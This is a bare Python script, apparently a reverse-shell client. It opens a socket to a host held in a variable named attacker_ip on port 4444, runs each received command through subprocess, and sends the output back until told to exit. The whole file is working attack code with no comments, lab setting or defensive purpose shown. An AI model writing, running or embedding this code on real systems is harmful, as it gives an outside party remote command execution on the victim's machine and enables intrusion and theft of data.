import socket
import subprocess
import os

attacker_ip = "0.0.0.0"
attacker_port = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((attacker_ip, attacker_port))

while True:
    try:
        command = client.recv(1024).decode().strip()

        if command.lower() == "exit":
            print("[*] Server requested exit.")
            break

        if command.startswith("cd "):
            try:
                os.chdir(command[3:].strip())
                output = f"Changed directory to: {os.getcwd()}"
            except Exception as e:
                output = f"Error: {e}"
        else:
            try:
                output = subprocess.getoutput(command)
            except Exception as e:
                output = f"Error: {e}"

        client.send(output.encode())

    except Exception as e:
        print(f"[-] Error: {e}")
        break

client.close()